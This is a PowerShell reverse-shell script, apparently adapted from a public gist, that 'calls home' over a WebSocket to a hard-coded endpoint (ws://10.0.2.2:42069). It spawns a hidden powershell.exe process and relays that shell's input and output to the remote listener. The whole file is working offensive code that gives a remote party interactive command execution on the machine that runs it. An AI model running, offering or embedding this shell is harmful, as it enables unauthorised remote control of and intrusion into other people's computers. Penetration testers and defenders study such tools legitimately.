﻿# Credits:
# https://gist.github.com/byt3bl33d3r/910b3161d54c2d6a3d5e1050c4e1013e
# https://stackoverflow.com/questions/23239127/powershell-stream-process-output-and-errors-while-running-external-process

# Might wanna change this
$endpoint = "ws://10.0.2.2:42069"

$ws = New-Object Net.WebSockets.ClientWebSocket
$cancellationTokenSource = New-Object Threading.CancellationTokenSource
$ByteQueue = New-Object 'System.Collections.Concurrent.ConcurrentQueue[Byte]'

# Call home
$ws.ConnectAsync($endpoint, $cancellationTokenSource.Token).
    GetAwaiter().
    GetResult()

Write-Host -ForegroundColor Green "Connected"

# Define the process start info for a shell
# Redirect all the streams so that we can interact with them
$StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{
    FileName = 'powershell.exe'
    Arguments = ''
    UseShellExecute = $false
    RedirectStandardOutput = $true
    RedirectStandardError = $true
    RedirectStandardInput = $true
}

# Define the process itself
$Process = New-Object System.Diagnostics.Process
$Process.StartInfo = $StartInfo
$Process.Start()
Write-Host -ForegroundColor Green "Started process"

$OutRunspace = [PowerShell]::Create()
$ErrRunspace = [PowerShell]::Create()
$SendRunspace = [PowerShell]::Create()

$OutRunspace.AddScript({
    param($Process, $ByteQueue)
    
    while ($true) {
        [Byte]$byte = $Process.StandardOutput.Read()
        $ByteQueue.Enqueue($byte)
    }
}).
AddParameter("Process",$Process).
AddParameter("ByteQueue",$ByteQueue).
BeginInvoke()

$ErrRunspace.AddScript({
    param($Process, $ByteQueue)

    while ($true) {
        [Byte]$byte = $Process.StandardError.Read()
        $ByteQueue.Enqueue($byte)
    }
}).
AddParameter("Process",$Process).
AddParameter("ByteQueue",$ByteQueue).
BeginInvoke()

Write-Host -ForegroundColor Green "Started reading streams"

$SendRunspace.AddScript({
    param($ws, $ByteQueue)

    $byte = $null
    $cancellationToken = New-Object Threading.CancellationToken($false)
    while($true) {
        while ($ByteQueue.TryDequeue([ref] $byte)) {
            $ByteArray = [ArraySegment[Byte]]::new($byte)
            $ws.SendAsync(
                    $ByteArray,
                    [System.Net.WebSockets.WebSocketMessageType]::Binary,
                    $true,
                    $cancellationToken
            ).GetAwaiter().GetResult()
        }
    }
}).
AddParameter("ws",$ws).
AddParameter("ByteQueue",$ByteQueue).
BeginInvoke()

Write-Host -ForegroundColor Green "Started runspace to forward streams"

# Kinda sucks that we read one byte at a time but the websocket
# requires an [ArraySegment[Byte]] to read bytes into it.
$buffer = [ArraySegment[Byte]]::new(0)
$cancellationToken = New-Object Threading.CancellationToken($false)

while ($ws.State -eq [Net.WebSockets.WebSocketState]::Open) {
    $received = $ws.ReceiveAsync($buffer, $cancellationToken).
	GetAwaiter().
	GetResult()
    if ($received.Count -eq 1) {
        [Byte] $b = $buffer.Array[0]
        if ($b -eq 127) {
    	    $Process.StandardInput.Write("`b")
        } else {
    	    $Process.StandardInput.Write([Char]$b)
        }
    }
}

$ws.CloseAsync(
    [System.Net.WebSockets.WebSocketCloseStatus]::Empty,
    "",
    $cancellationToken
).GetAwaiter().GetResult()

Write-Host -ForegroundColor Red "Closing WebSocket"

$ws.Dispose()

Write-Host -ForegroundColor Red "Stopping runspaces"

$OutRunspace.Stop()
$OutRunspace.Dispose()

$ErrRunspace.Stop()
$ErrRunspace.Dispose()

$SendRunspace.Stop()
$SendRunspace.Dispose()
